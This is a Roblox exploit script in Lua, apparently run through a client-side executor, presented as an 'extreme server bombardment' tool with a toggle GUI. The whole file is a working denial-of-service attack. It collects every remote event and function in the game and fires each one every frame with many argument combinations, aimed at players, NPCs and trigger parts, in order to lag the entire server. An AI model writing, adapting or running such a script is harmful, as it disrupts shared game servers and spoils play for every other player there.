-- EXTREME SERVER BOMBARDMENT SCRIPT (FE)
-- Fires EVERY remote possible to lag the entire server

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")

-- Initialize
getgenv().ExtremeLag = getgenv().ExtremeLag or false
local LocalPlayer = Players.LocalPlayer

-- Cache for remotes (performance boost)
local cachedTouchEvents = {}
local cachedRemoteEvents = {}
local cachedRemoteFunctions = {}
local cachedBindableEvents = {}

-- AGGRESSIVE REMOTE FINDER - Searches EVERYTHING
local function scanAllRemotes()
    print("[SCAN] Starting aggressive remote scan...")
    
    cachedTouchEvents = {}
    cachedRemoteEvents = {}
    cachedRemoteFunctions = {}
    cachedBindableEvents = {}
    
    local locations = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ReplicatedFirst"),
        game:GetService("JointsService"),
        game:GetService("Workspace"),
        game:GetService("Players"),
        game:GetService("Lighting"),
        game:GetService("ServerStorage"), -- Will error but worth trying
        game:GetService("ServerScriptService"), -- Will error but worth trying
    }
    
    for _, location in pairs(locations) do
        pcall(function()
            for _, descendant in pairs(location:GetDescendants()) do
                -- TouchEvents
                if descendant:IsA("RemoteEvent") and descendant.Name == "TouchEvent" then
                    table.insert(cachedTouchEvents, descendant)
                end
                
                -- ALL RemoteEvents (not just TouchEvent)
                if descendant:IsA("RemoteEvent") then
                    table.insert(cachedRemoteEvents, descendant)
                end
                
                -- RemoteFunctions
                if descendant:IsA("RemoteFunction") then
                    table.insert(cachedRemoteFunctions, descendant)
                end
                
                -- BindableEvents
                if descendant:IsA("BindableEvent") then
                    table.insert(cachedBindableEvents, descendant)
                end
            end
        end)
    end
    
    print("[SCAN] ‚úì Found " .. #cachedTouchEvents .. " TouchEvents")
    print("[SCAN] ‚úì Found " .. #cachedRemoteEvents .. " RemoteEvents")
    print("[SCAN] ‚úì Found " .. #cachedRemoteFunctions .. " RemoteFunctions")
    print("[SCAN] ‚úì Found " .. #cachedBindableEvents .. " BindableEvents")
    
    return {
        touchEvents = #cachedTouchEvents,
        remoteEvents = #cachedRemoteEvents,
        remoteFunctions = #cachedRemoteFunctions,
        bindableEvents = #cachedBindableEvents
    }
end

-- Get all target parts (trip parts, seats, etc)
local function getAllTargetParts()
    local parts = {}
    
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            -- Get parts that are likely triggers
            if obj.Name:lower():find("trip") or 
               obj.Name:lower():find("trigger") or
               obj.Name:lower():find("touch") or
               obj.Name:lower():find("seat") or
               obj.Name:lower():find("platform") then
                table.insert(parts, obj)
            end
        end
    end
    
    return parts
end

-- Get all players AND their characters
local function getAllTargets()
    local targets = {}
    
    -- Add all players
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character then
            if player.Character:FindFirstChild("HumanoidRootPart") then
                table.insert(targets, {
                    type = "player",
                    character = player.Character,
                    hrp = player.Character.HumanoidRootPart,
                    humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                })
            end
        end
    end
    
    -- Add all NPCs/Customers
    if Workspace:FindFirstChild("Customers") then
        for _, customer in pairs(Workspace.Customers:GetChildren()) do
            if customer:FindFirstChild("HumanoidRootPart") then
                table.insert(targets, {
                    type = "npc",
                    character = customer,
                    hrp = customer.HumanoidRootPart,
                    humanoid = customer:FindFirstChildOfClass("Humanoid")
                })
            end
        end
    end
    
    return targets
end

-- EXTREME LAG FUNCTION - Fires EVERYTHING at maximum speed
local function extremeBombardment()
    local targets = getAllTargets()
    local parts = getAllTargetParts()
    
    if #targets == 0 then return end
    
    -- Fire ALL TouchEvents with ALL combinations
    for _, touchEvent in pairs(cachedTouchEvents) do
        for _, target in pairs(targets) do
            for _, part in pairs(parts) do
                pcall(function()
                    touchEvent:FireServer(target.hrp, part)
                    touchEvent:FireServer(target.humanoid, part)
                    touchEvent:FireServer(target.character, part)
                end)
            end
        end
    end
    
    -- Fire ALL RemoteEvents with various argument combinations
    for _, remoteEvent in pairs(cachedRemoteEvents) do
        for _, target in pairs(targets) do
            pcall(function()
                -- Try different argument patterns
                remoteEvent:FireServer()
                remoteEvent:FireServer(target.hrp)
                remoteEvent:FireServer(target.character)
                remoteEvent:FireServer(target.humanoid)
                remoteEvent:FireServer(target.hrp, target.character)
                remoteEvent:FireServer(true)
                remoteEvent:FireServer(false)
                remoteEvent:FireServer(1)
                remoteEvent:FireServer("spam")
            end)
        end
    end
    
    -- Invoke ALL RemoteFunctions (these can cause major lag)
    for _, remoteFunc in pairs(cachedRemoteFunctions) do
        for _, target in pairs(targets) do
            pcall(function()
                remoteFunc:InvokeServer()
                remoteFunc:InvokeServer(target.hrp)
                remoteFunc:InvokeServer(target.character)
                remoteFunc:InvokeServer(true)
            end)
        end
    end
    
    -- Fire BindableEvents (client-side but can cause lag)
    for _, bindable in pairs(cachedBindableEvents) do
        pcall(function()
            bindable:Fire()
            bindable:Fire(true)
            bindable:Fire("spam")
        end)
    end
end

-- Create GUI
local ScreenGui, StatusLabel, TouchEventStat, RemoteEventStat, RemoteFuncStat, TargetStat, ToggleButton

local function createGUI()
    if CoreGui:FindFirstChild("ExtremeLagGUI") then
        CoreGui.ExtremeLagGUI:Destroy()
    end
    
    ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "ExtremeLagGUI"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.Parent = CoreGui
    
    -- Main Frame
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 380, 0, 340)
    MainFrame.Position = UDim2.new(0.5, -190, 0.1, 0)
    MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 15)
    UICorner.Parent = MainFrame
    
    -- Stroke
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Color = Color3.fromRGB(255, 50, 50)
    UIStroke.Thickness = 2
    UIStroke.Parent = MainFrame
    
    -- Animated pulsing stroke
    spawn(function()
        while MainFrame.Parent do
            for i = 2, 4 do
                if not MainFrame.Parent then break end
                UIStroke.Thickness = i
                wait(0.1)
            end
            for i = 4, 2, -1 do
                if not MainFrame.Parent then break end
                UIStroke.Thickness = i
                wait(0.1)
            end
        end
    end)
    
    -- Title Bar
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.BackgroundColor3 = Color3.fromRGB(255, 20, 20)
    Title.BorderSizePixel = 0
    Title.Text = "‚ö†Ô∏è EXTREME SERVER LAG ‚ö†Ô∏è"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 20
    Title.Font = Enum.Font.GothamBold
    Title.Parent = MainFrame
    
    local TitleCorner = Instance.new("UICorner")
    TitleCorner.CornerRadius = UDim.new(0, 15)
    TitleCorner.Parent = Title
    
    -- Warning Label
    local Warning = Instance.new("TextLabel")
    Warning.Size = UDim2.new(1, -20, 0, 35)
    Warning.Position = UDim2.new(0, 10, 0, 60)
    Warning.BackgroundColor3 = Color3.fromRGB(80, 20, 20)
    Warning.BorderSizePixel = 0
    Warning.Text = "‚ö° THIS WILL LAG THE ENTIRE SERVER ‚ö°"
    Warning.TextColor3 = Color3.fromRGB(255, 200, 100)
    Warning.TextSize = 14
    Warning.Font = Enum.Font.GothamBold
    Warning.Parent = MainFrame
    
    local WarnCorner = Instance.new("UICorner")
    WarnCorner.CornerRadius = UDim.new(0, 8)
    WarnCorner.Parent = Warning
    
    -- Stats Frame
    local StatsFrame = Instance.new("Frame")
    StatsFrame.Size = UDim2.new(1, -20, 0, 110)
    StatsFrame.Position = UDim2.new(0, 10, 0, 105)
    StatsFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
    StatsFrame.BorderSizePixel = 0
    StatsFrame.Parent = MainFrame
    
    local StatsCorner = Instance.new("UICorner")
    StatsCorner.CornerRadius = UDim.new(0, 10)
    StatsCorner.Parent = StatsFrame
    
    -- Stats
    TouchEventStat = Instance.new("TextLabel")
    TouchEventStat.Size = UDim2.new(1, -10, 0, 22)
    TouchEventStat.Position = UDim2.new(0, 5, 0, 5)
    TouchEventStat.BackgroundTransparency = 1
    TouchEventStat.Text = "üéØ TouchEvents: 0"
    TouchEventStat.TextColor3 = Color3.fromRGB(100, 255, 150)
    TouchEventStat.TextSize = 13
    TouchEventStat.Font = Enum.Font.GothamBold
    TouchEventStat.TextXAlignment = Enum.TextXAlignment.Left
    TouchEventStat.Parent = StatsFrame
    
    RemoteEventStat = Instance.new("TextLabel")
    RemoteEventStat.Size = UDim2.new(1, -10, 0, 22)
    RemoteEventStat.Position = UDim2.new(0, 5, 0, 29)
    RemoteEventStat.BackgroundTransparency = 1
    RemoteEventStat.Text = "üì° RemoteEvents: 0"
    RemoteEventStat.TextColor3 = Color3.fromRGB(255, 200, 100)
    RemoteEventStat.TextSize = 13
    RemoteEventStat.Font = Enum.Font.GothamBold
    RemoteEventStat.TextXAlignment = Enum.TextXAlignment.Left
    RemoteEventStat.Parent = StatsFrame
    
    RemoteFuncStat = Instance.new("TextLabel")
    RemoteFuncStat.Size = UDim2.new(1, -10, 0, 22)
    RemoteFuncStat.Position = UDim2.new(0, 5, 0, 53)
    RemoteFuncStat.BackgroundTransparency = 1
    RemoteFuncStat.Text = "‚ö° RemoteFunctions: 0"
    RemoteFuncStat.TextColor3 = Color3.fromRGB(255, 150, 255)
    RemoteFuncStat.TextSize = 13
    RemoteFuncStat.Font = Enum.Font.GothamBold
    RemoteFuncStat.TextXAlignment = Enum.TextXAlignment.Left
    RemoteFuncStat.Parent = StatsFrame
    
    TargetStat = Instance.new("TextLabel")
    TargetStat.Size = UDim2.new(1, -10, 0, 22)
    TargetStat.Position = UDim2.new(0, 5, 0, 77)
    TargetStat.BackgroundTransparency = 1
    TargetStat.Text = "üë• Targets: 0 | üéØ Parts: 0"
    TargetStat.TextColor3 = Color3.fromRGB(150, 200, 255)
    TargetStat.TextSize = 13
    TargetStat.Font = Enum.Font.GothamBold
    TargetStat.TextXAlignment = Enum.TextXAlignment.Left
    TargetStat.Parent = StatsFrame
    
    -- Status
    StatusLabel = Instance.new("TextLabel")
    StatusLabel.Size = UDim2.new(1, -20, 0, 35)
    StatusLabel.Position = UDim2.new(0, 10, 0, 225)
    StatusLabel.BackgroundTransparency = 1
    StatusLabel.Text = "üí§ Status: INACTIVE"
    StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    StatusLabel.TextSize = 18
    StatusLabel.Font = Enum.Font.GothamBold
    StatusLabel.Parent = MainFrame
    
    -- Toggle Button
    ToggleButton = Instance.new("TextButton")
    ToggleButton.Size = UDim2.new(1, -20, 0, 50)
    ToggleButton.Position = UDim2.new(0, 10, 0, 270)
    ToggleButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    ToggleButton.BorderSizePixel = 0
    ToggleButton.Text = "üî• START EXTREME LAG üî•"
    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleButton.TextSize = 18
    ToggleButton.Font = Enum.Font.GothamBold
    ToggleButton.Parent = MainFrame
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 12)
    ButtonCorner.Parent = ToggleButton
    
    -- Button glow effect
    local ButtonStroke = Instance.new("UIStroke")
    ButtonStroke.Color = Color3.fromRGB(255, 100, 100)
    ButtonStroke.Thickness = 3
    ButtonStroke.Transparency = 0.5
    ButtonStroke.Parent = ToggleButton
    
    -- Close Button
    local CloseButton = Instance.new("TextButton")
    CloseButton.Size = UDim2.new(0, 45, 0, 45)
    CloseButton.Position = UDim2.new(1, -50, 0, 2.5)
    CloseButton.BackgroundTransparency = 1
    CloseButton.Text = "‚úï"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.TextSize = 28
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.Parent = MainFrame
    
    -- Dragging
    local dragging, dragInput, dragStart, startPos
    
    Title.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    Title.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)
    
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    
    -- Button Click
    ToggleButton.MouseButton1Click:Connect(function()
        getgenv().ExtremeLag = not getgenv().ExtremeLag
        updateGUI()
        
        if getgenv().ExtremeLag then
            StarterGui:SetCore("SendNotification", {
                Title = "‚ö†Ô∏è EXTREME LAG ACTIVATED";
                Text = "SERVER BOMBARDMENT IN PROGRESS!";
                Duration = 3;
            })
        end
    end)
    
    CloseButton.MouseButton1Click:Connect(function()
        getgenv().ExtremeLag = false
        ScreenGui:Destroy()
    end)
end

-- Update GUI
function updateGUI()
    if not StatusLabel or not ToggleButton then return end
    
    if getgenv().ExtremeLag then
        StatusLabel.Text = "üí• Status: DESTROYING SERVER üí•"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
        ToggleButton.Text = "‚è∏Ô∏è STOP LAG"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
    else
        StatusLabel.Text = "üí§ Status: INACTIVE"
        StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
        ToggleButton.Text = "üî• START EXTREME LAG üî•"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    end
end

-- Update stats
function updateStats()
    if not TouchEventStat then return end
    
    local targets = getAllTargets()
    local parts = getAllTargetParts()
    
    TouchEventStat.Text = "üéØ TouchEvents: " .. #cachedTouchEvents
    RemoteEventStat.Text = "üì° RemoteEvents: " .. #cachedRemoteEvents
    RemoteFuncStat.Text = "‚ö° RemoteFunctions: " .. #cachedRemoteFunctions
    TargetStat.Text = "üë• Targets: " .. #targets .. " | üéØ Parts: " .. #parts
end

-- EXTREME LAG LOOP - Runs as fast as possible
spawn(function()
    while true do
        RunService.Heartbeat:Wait() -- Runs every frame for maximum speed
        if getgenv().ExtremeLag then
            pcall(extremeBombardment)
        end
    end
end)

-- Stats update loop
spawn(function()
    while wait(3) do
        if ScreenGui and ScreenGui.Parent then
            updateStats()
        end
    end
end)

-- Rescan remotes periodically
spawn(function()
    while wait(10) do
        scanAllRemotes()
        updateStats()
    end
end)

-- Initialize
scanAllRemotes()
createGUI()
wait(0.5)
updateStats()
updateGUI()

StarterGui:SetCore("SendNotification", {
    Title = "‚ö†Ô∏è EXTREME LAG SCRIPT";
    Text = "Loaded " .. #cachedRemoteEvents .. " remotes. Ready to destroy!";
    Duration = 4;
})

print("========================================")
print("EXTREME SERVER LAG SCRIPT LOADED")
print("RemoteEvents: " .. #cachedRemoteEvents)
print("TouchEvents: " .. #cachedTouchEvents)
print("RemoteFunctions: " .. #cachedRemoteFunctions)
print("THIS WILL LAG THE ENTIRE SERVER!")
print("========================================")